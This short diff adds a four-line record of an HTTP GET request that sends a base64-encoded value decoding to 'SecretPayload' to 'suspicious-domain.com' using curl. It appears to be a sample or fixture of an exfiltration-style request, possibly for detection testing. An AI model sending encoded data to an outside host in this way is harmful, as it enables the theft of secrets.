@@ -1,0 +1,4 @@
+GET /api/data?payload=U2VjcmV0UGF5bG9hZA==
+Host: suspicious-domain.com
+User-Agent: curl/7.68.0
+Response: 200 OK
